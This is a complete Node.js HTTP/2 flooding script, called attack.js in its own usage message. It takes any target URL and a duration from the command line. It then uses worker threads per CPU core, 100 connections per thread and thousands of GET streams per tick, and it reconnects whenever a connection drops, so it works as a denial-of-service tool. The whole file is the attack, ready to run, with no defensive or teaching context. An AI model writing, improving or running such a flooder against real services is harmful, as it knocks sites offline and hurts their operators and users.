const http2 = require('http2');
const { Worker, isMainThread, workerData } = require('worker_threads');
const { cpus } = require('os');

const THREADS = cpus().length * 2; // double workers per core
const CONNECTIONS = 100;           // per thread
const STREAMS_PER_TICK = 2000;     // per connection

if (isMainThread) {
    if (process.argv.length < 4) {
        console.log('Usage: node attack.js <https://target> <duration_secs>');
        process.exit(1);
    }

    const target = process.argv[2];
    const duration = parseInt(process.argv[3]);

    console.log(`Launching on ${target} for ${duration}s using ${THREADS} threads...`);

    for (let i = 0; i < THREADS; i++) {
        new Worker(__filename, { workerData: { target, duration } });
    }
} else {
    const { target, duration } = workerData;
    const end = Date.now() + duration * 1000;

    function startSession() {
        try {
            const client = http2.connect(target, {
                settings: { enablePush: false },
                rejectUnauthorized: false
            });

            client.on('connect', () => {
                function sendSpam() {
                    if (Date.now() > end || client.destroyed || client.closed) return;
                    try {
                        for (let i = 0; i < STREAMS_PER_TICK; i++) {
                            const req = client.request({
                                ':method': 'GET',
                                ':path': '/',
                            });
                            req.end(); // no response handlers — faster GC
                        }
                        setImmediate(sendSpam);
                    } catch (_) {
                        client.destroy();
                    }
                }
                sendSpam();
            });

            client.on('error', () => {});
            client.on('close', () => setTimeout(startSession, 10));
        } catch {
            setTimeout(startSession, 10);
        }
    }

    for (let i = 0; i < CONNECTIONS; i++) startSession();
}
